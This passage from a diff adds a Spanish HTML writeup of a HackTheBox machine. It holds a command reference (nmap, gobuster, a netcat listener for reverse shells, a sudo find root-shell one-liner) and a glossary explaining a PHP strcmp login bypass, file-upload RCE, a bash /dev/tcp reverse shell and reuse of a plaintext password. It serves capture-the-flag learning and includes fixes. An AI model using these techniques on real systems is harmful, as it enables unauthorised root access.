+          <div class="cred-val">GTFOBins · sudo explotación</div>
+        </div>
+        <div class="cred-item">
+          <div class="cred-label">RESULTADO</div>
+          <div class="cred-val">root ✓ · root.txt obtenido</div>
+        </div>
+      </div>
+    </div>
+
+    <hr class="divider">
+
+    <!-- REFERENCIA DE COMANDOS -->
+    <div class="section" id="referencia">
+      <p class="section-label">// 10</p>
+      <h2 class="section-title">Referencia de Comandos</h2>
+      <div class="section-line"></div>
+
+      <div class="cmd-ref-grid">
+
+        <div class="cmd-ref-card">
+          <div class="cmd-ref-name">nmap</div>
+          <div class="cmd-ref-syntax">sudo nmap -p- -sSCV -n -Pn --min-rate=5000 --open &lt;IP&gt; -oX out.xml</div>
+          <div class="cmd-ref-desc">Escáner de puertos y servicios. Enumera todos los puertos TCP, detecta versiones y lanza scripts NSE de reconocimiento.</div>
+          <ul class="cmd-ref-flags">
+            <li><span>-p-</span> · escanea los 65535 puertos TCP</li>
+            <li><span>-sS</span> · SYN scan (sigiloso, no completa el 3-way handshake)</li>
+            <li><span>-sC</span> · ejecuta scripts NSE predeterminados (default scripts)</li>
+            <li><span>-sV</span> · detección de versiones de servicios</li>
+            <li><span>-n</span> · sin resolución DNS (más rápido)</li>
+            <li><span>-Pn</span> · sin ping previo (asume host activo)</li>
+            <li><span>--min-rate=5000</span> · mínimo 5000 paquetes/segundo</li>
+            <li><span>--open</span> · muestra solo puertos abiertos</li>
+            <li><span>-oX</span> · exporta resultado en formato XML</li>
+          </ul>
+        </div>
+
+        <div class="cmd-ref-card">
+          <div class="cmd-ref-name">xsltproc</div>
+          <div class="cmd-ref-syntax">xsltproc &lt;archivo.xml&gt; -o &lt;reporte.html&gt;</div>
+          <div class="cmd-ref-desc">Procesador XSLT que transforma documentos XML aplicando una hoja de estilos. Nmap incluye la hoja XSL para convertir sus XML a HTML visual.</div>
+          <ul class="cmd-ref-flags">
+            <li><span>archivo.xml</span> · el XML exportado por nmap</li>
+            <li><span>-o</span> · archivo de salida (output)</li>
+            <li><span>reporte.html</span> · nombre del HTML resultante</li>
+          </ul>
+        </div>
+
+        <div class="cmd-ref-card">
+          <div class="cmd-ref-name">gobuster</div>
+          <div class="cmd-ref-syntax">gobuster dir -u &lt;URL&gt; -w &lt;wordlist&gt; -t &lt;threads&gt; -x &lt;ext&gt;</div>
+          <div class="cmd-ref-desc">Herramienta de fuerza bruta para descubrimiento de directorios y archivos web. Prueba cada entrada del wordlist como ruta HTTP y registra las respuestas.</div>
+          <ul class="cmd-ref-flags">
+            <li><span>dir</span> · modo de enumeración de directorios</li>
+            <li><span>-u</span> · URL objetivo</li>
+            <li><span>-w</span> · wordlist (lista de palabras a probar)</li>
+            <li><span>-t</span> · número de threads paralelos</li>
+            <li><span>-x</span> · extensiones adicionales a probar (ej: php, txt, bak)</li>
+          </ul>
+        </div>
+
+        <div class="cmd-ref-card">
+          <div class="cmd-ref-name">strings</div>
+          <div class="cmd-ref-syntax">strings &lt;archivo&gt;</div>
+          <div class="cmd-ref-desc">Extrae y muestra las cadenas de texto legibles de un archivo binario. Útil para analizar archivos swap de Vim (.swp) y recuperar código fuente o credenciales.</div>
+          <ul class="cmd-ref-flags">
+            <li><span>archivo</span> · el archivo a analizar (binario o swap)</li>
+            <li><span>-n &lt;N&gt;</span> · longitud mínima de cadena a mostrar (por defecto 4)</li>
+            <li><span>-a</span> · escanea todo el archivo, no solo secciones de datos</li>
+          </ul>
+        </div>
+
+        <div class="cmd-ref-card">
+          <div class="cmd-ref-name">nc (netcat)</div>
+          <div class="cmd-ref-syntax">nc -lvnp &lt;puerto&gt;</div>
+          <div class="cmd-ref-desc">Herramienta de red multipropósito. En modo listener, espera conexiones entrantes en el puerto especificado. Esencial para recibir reverse shells.</div>
+          <ul class="cmd-ref-flags">
+            <li><span>-l</span> · modo listen (escucha conexiones entrantes)</li>
+            <li><span>-v</span> · verbose (muestra información de conexión)</li>
+            <li><span>-n</span> · sin resolución DNS</li>
+            <li><span>-p</span> · especifica el puerto a escuchar</li>
+          </ul>
+        </div>
+
+        <div class="cmd-ref-card">
+          <div class="cmd-ref-name">sudo find (privesc)</div>
+          <div class="cmd-ref-syntax">sudo /usr/bin/find . -exec /bin/sh \; -quit</div>
+          <div class="cmd-ref-desc">Abusa del permiso sudo sobre find para obtener una shell como root. Find ejecuta el comando dado en -exec con los privilegios de root heredados de sudo.</div>
+          <ul class="cmd-ref-flags">
+            <li><span>sudo</span> · ejecuta el siguiente comando como root</li>
+            <li><span>.</span> · busca en el directorio actual</li>
+            <li><span>-exec</span> · ejecuta el comando por cada resultado encontrado</li>
+            <li><span>/bin/sh</span> · shell que se lanza como root</li>
+            <li><span>\;</span> · termina el bloque -exec</li>
+            <li><span>-quit</span> · detiene find tras el primer resultado (evita loops)</li>
+          </ul>
+        </div>
+
+      </div>
+    </div>
+
+    <hr class="divider">
+
+    <!-- GLOSARIO -->
+    <div class="section" id="glosario">
+      <p class="section-label">// 11</p>
+      <h2 class="section-title">Glosario</h2>
+      <div class="section-line"></div>
+
+      <div class="glosario-grid">
+
+        <div class="glos-card">
+          <div class="glos-term">PHP Type Juggling — strcmp() Bypass</div>
+          <div class="glos-def">PHP es un lenguaje de tipado débil y dinámico: cuando se comparan valores de tipos distintos, realiza <strong>conversiones automáticas de tipo</strong> (type coercion) antes de comparar. La función <strong>strcmp($a, $b)</strong> espera dos strings; si se le pasa un array, retorna <strong>NULL</strong> en lugar de un número. El problema surge al usar el operador <code>==</code> (comparación laxa): en PHP, <code>NULL == 0</code> es <strong>TRUE</strong>. Por tanto, si el formulario envía <code>password[]=</code> (un array vacío), strcmp() retorna NULL, NULL == 0 es TRUE, y la condición del login se cumple sin conocer la contraseña real. La solución es usar <code>===</code> (comparación estricta de tipo y valor) o <code>hash_equals()</code>.</div>
+        </div>
+
+        <div class="glos-card">
+          <div class="glos-term">Directory Listing — Listado de Directorios Apache</div>
+          <div class="glos-def">El <strong>directory listing</strong> ocurre cuando Apache muestra el contenido completo de una carpeta porque: (1) no existe un archivo index (index.html, index.php) en el directorio, y (2) la directiva <code>Options +Indexes</code> está habilitada o no se ha deshabilitado con <code>Options -Indexes</code>. Expone toda la estructura de archivos del servidor al visitante, incluyendo archivos de configuración, backups, archivos swap y otros archivos sensibles. En producción nunca debe estar habilitado. Se desactiva añadiendo <code>Options -Indexes</code> en la configuración de Apache o en <code>.htaccess</code>.</div>
+        </div>
+
+        <div class="glos-card">
+          <div class="glos-term">Archivo Swap de Vim (.swp)</div>
+          <div class="glos-def">Cuando Vim abre un archivo para edición, crea automáticamente un <strong>archivo swap</strong> con el mismo nombre pero con extensión <code>.swp</code> (ej: <code>login.php.swp</code>) en el mismo directorio. Este archivo se usa como <strong>buffer temporal</strong> para recuperar cambios no guardados si el editor se cierra inesperadamente (crash, cierre de sesión SSH, corte de conexión). El swap contiene una copia del contenido del archivo en edición. Si el servidor tiene directory listing habilitado y el desarrollador editó archivos directamente en el servidor, estos swaps quedan accesibles públicamente y revelan el <strong>código fuente</strong> original. Se pueden leer con <code>vim -r archivo.swp</code> o <code>strings archivo.swp</code>.</div>
+        </div>
+
+        <div class="glos-card">
+          <div class="glos-term">File Upload sin Validación — Remote Code Execution (RCE)</div>
+          <div class="glos-def">Una vulnerabilidad de <strong>File Upload</strong> sin validación permite que un atacante suba cualquier tipo de archivo al servidor, incluyendo scripts ejecutables. En un servidor PHP, si el directorio de uploads tiene permisos de ejecución PHP, cualquier archivo <code>.php</code> subido será <strong>ejecutado por el servidor</strong> cuando se realice una petición HTTP al archivo. Una <strong>reverse shell PHP</strong> es un script que, al ejecutarse en el servidor, establece una conexión TCP de vuelta al atacante entregando control total del sistema. La validación correcta incluye: verificar el tipo MIME real del archivo (no la extensión), usar una lista blanca de extensiones permitidas, almacenar archivos subidos fuera del webroot o en un directorio sin permisos de ejecución PHP.</div>
+        </div>
+
+        <div class="glos-card">
+          <div class="glos-term">Reverse Shell — bash -i &gt;&amp; /dev/tcp</div>
+          <div class="glos-def">Una <strong>reverse shell</strong> es una técnica donde el servidor víctima inicia la conexión hacia el atacante (al contrario de una bind shell, donde el atacante se conecta al servidor). Esto elude firewalls que bloquean conexiones entrantes pero permiten las salientes. El mecanismo <code>/dev/tcp/IP/PUERTO</code> es una función especial de <strong>Bash</strong> que abre un socket TCP hacia la IP y puerto especificados. Combinado con <code>bash -i</code> (bash interactivo) y la redirección <code>&gt;&amp; ... 0&gt;&amp;1</code> (redirigir stdout/stderr y stdin al socket), obtenemos una shell completa a través de la conexión TCP. El atacante escucha con <strong>netcat</strong> (<code>nc -lvnp PUERTO</code>) y recibe la conexión.</div>
+        </div>
+
+        <div class="glos-card">
+          <div class="glos-term">Credenciales en Texto Plano — Clear Text Credentials</div>
+          <div class="glos-def">Almacenar contraseñas en <strong>texto plano</strong> (sin cifrar ni hashear) en archivos de configuración es una práctica gravemente insegura. Si un atacante obtiene acceso de lectura a esos archivos (mediante RCE, path traversal, LFI u otro vector), obtiene las contraseñas reales inmediatamente. La práctica correcta es almacenar <strong>hashes</strong> de contraseñas con algoritmos modernos como <strong>bcrypt</strong>, <strong>Argon2</strong> o <strong>scrypt</strong>, que son resistentes a ataques de fuerza bruta. Las credenciales de configuración de base de datos deben almacenarse en variables de entorno o en archivos fuera del webroot con permisos restrictivos.</div>
+        </div>
+
+        <div class="glos-card">
+          <div class="glos-term">sudo — Superuser Do</div>
+          <div class="glos-def"><strong>sudo</strong> (superuser do) es un programa de Unix que permite a usuarios ejecutar comandos con los privilegios de otro usuario (usualmente root) de forma controlada y auditable. Los permisos se configuran en <code>/etc/sudoers</code>: se especifica qué usuarios pueden ejecutar qué comandos como qué usuarios. <code>sudo -l</code> lista los permisos del usuario actual. El peligro surge cuando se concede permiso sudo sobre binarios que pueden <strong>ejecutar código arbitrario</strong> (como find, python, vim, less, etc.): el atacante puede usar esa capacidad para lanzar una shell como root. <strong>GTFOBins</strong> documenta estos vectores.</div>
+        </div>
+
+        <div class="glos-card">
+          <div class="glos-term">GTFOBins — Binarios Unix para Privesc</div>
+          <div class="glos-def"><strong>GTFOBins</strong> (gtfobins.github.io) es un repositorio curado por la comunidad de ciberseguridad que documenta cómo binarios Unix estándar pueden ser abusados para: <strong>escalar privilegios</strong> (SUID/sudo), <strong>leer/escribir archivos arbitrarios</strong>, <strong>obtener shells</strong>, o <strong>exfiltrar datos</strong>. El nombre viene de "Get The F*** Out (of restricted environments)". Para <code>find</code> con sudo, el abuso es directo: <code>find -exec /bin/sh \; -quit</code> lanza una shell con los privilegios con que se ejecutó find. Para cada binario, documenta los casos aplicables (SUID, sudo, capabilities) con el comando exacto. Es la referencia definitiva para post-explotación en Linux.</div>
+        </div>
+
+        <div class="glos-card">
+          <div class="glos-term">SSH — Secure Shell</div>
+          <div class="glos-def"><strong>SSH (Secure Shell)</strong> es un protocolo de red criptográfico para operar servicios de red de forma segura sobre redes no confiables. Cifra toda la comunicación mediante criptografía asimétrica. Opera en el <strong>puerto 22</strong> por defecto. La autenticación puede ser: <strong>por contraseña</strong> (la contraseña viaja cifrada dentro del túnel SSH) o <strong>por clave pública</strong> (par de claves RSA/ECDSA/ED25519; el servidor guarda la pública, el cliente demuestra poseer la privada). Es el método estándar para administración remota de servidores Linux. En este caso, la reutilización de credenciales (misma contraseña para la aplicación web y para el sistema operativo) permitió el acceso SSH con las credenciales obtenidas de <code>config.php</code>.</div>
+        </div>
+
+        <div class="glos-card">
+          <div class="glos-term">Reutilización de Contraseñas — Password Reuse</div>
+          <div class="glos-def">La <strong>reutilización de contraseñas</strong> ocurre cuando un usuario o sistema usa la misma contraseña en múltiples contextos. En este caso, la contraseña del usuario administrador de la aplicación web (<code>thisisagoodpassword</code> en <code>config.php</code>) era la misma que la del usuario de sistema <strong>john</strong>. Esto permite que un atacante que compromete un sistema (obteniendo credenciales de la web) escale lateralmente a otros sistemas o cuentas sin necesitar ningún exploit adicional. La práctica correcta es usar contraseñas únicas y aleatorias para cada servicio, idealmente gestionadas con un gestor de contraseñas.</div>
+        </div>
+
+      </div>
+    </div>
+
+  </main>
+</div>
+
+<!-- FOOTER -->
+<footer>
+  <p>© 2026 <span>Brandon Zevallos Pastrana</span> — Writeup personal · HackTheBox</p>
+  <p>Built with <span>kali linux</span> &amp; <span>❤</span></p>
+</footer>
+
+<script>
+  // ACTIVE TOC
+  const sections = document.querySelectorAll('.section[id]');
+  const tocLinks = document.querySelectorAll('.toc-list a');
+  const tocObserver = new IntersectionObserver(entries => {
+    entries.forEach(e => {
+      if (e.isIntersecting) {
+        tocLinks.forEach(a => a.classList.remove('active'));
+        const active = document.querySelector(`.toc-list a[href="#${e.target.id}"]`);
+        if (active) active.classList.add('active');
+      }
+    });
+  }, { rootMargin: '-30% 0px -60% 0px' });
+  sections.forEach(s => tocObserver.observe(s));
+
+  // CURSOR
+  const cursor = document.getElementById('cursor');
+  const ring   = document.getElementById('cursorRing');
+  document.addEventListener('mousemove', e => {
+    cursor.style.left = e.clientX + 'px'; cursor.style.top = e.clientY + 'px';
+    ring.style.left   = e.clientX + 'px'; ring.style.top   = e.clientY + 'px';
+    cursor.style.opacity = '1'; ring.style.opacity = '0.5';
+  });
+  document.addEventListener('mousedown', () => { cursor.style.transform = 'translate(-50%,-50%) scale(0.5)'; });
+  document.addEventListener('mouseup',   () => { cursor.style.transform = 'translate(-50%,-50%)'; });
+  document.querySelectorAll('a, button').forEach(el => {
+    el.addEventListener('mouseenter', () => { ring.style.width = '54px'; ring.style.height = '54px'; ring.style.opacity = '0.3'; });
+    el.addEventListener('mouseleave', () => { ring.style.width = '36px'; ring.style.height = '36px'; ring.style.opacity = '0.5'; });
+  });
+
+  // SCROLL REVEAL
+  const obs = new IntersectionObserver(entries => {
+    entries.forEach(e => { if (e.isIntersecting) e.target.classList.add('visible'); });
+  }, { threshold: 0.06 });
+  document.querySelectorAll('.section').forEach(s => obs.observe(s));
+
+  // PROGRESS BAR
+  window.addEventListener('scroll', () => {
+    const winScroll = document.documentElement.scrollTop;
+    const height = document.documentElement.scrollHeight - window.innerHeight;
+    const scrolled = height > 0 ? (winScroll / height) * 100 : 0;
+    const bar = document.getElementById('readingProgress');
+    if (bar) bar.style.width = scrolled + '%';
+  });
+
+  // TOAST
+  function showToast(msg) {
+    let toast = document.querySelector('.toast');
+    if (!toast) {
+      toast = document.createElement('div');
+      toast.className = 'toast';
+      document.body.appendChild(toast);
+    }
+    toast.textContent = '📋 ' + msg;
+    toast.classList.add('show');
+    setTimeout(() => toast.classList.remove('show'), 2000);
+  }
+
+  // COPY COMMAND
+  function copyCmd(btn) {
+    const block = btn.closest('.cmd-block');
+    const cmd = block.dataset.cmd || '';
+    navigator.clipboard.writeText(cmd).then(() => {
+      btn.textContent = '✓ OK';
+      btn.classList.add('copied');
+      showToast('Comando copiado ✓');
+      setTimeout(() => {
+        btn.textContent = 'COPY';
+        btn.classList.remove('copied');
+      }, 1800);
+    }).catch(() => {
+      showToast('Error al copiar');
+    });
+  }
+</script>
+</body>
+</html>
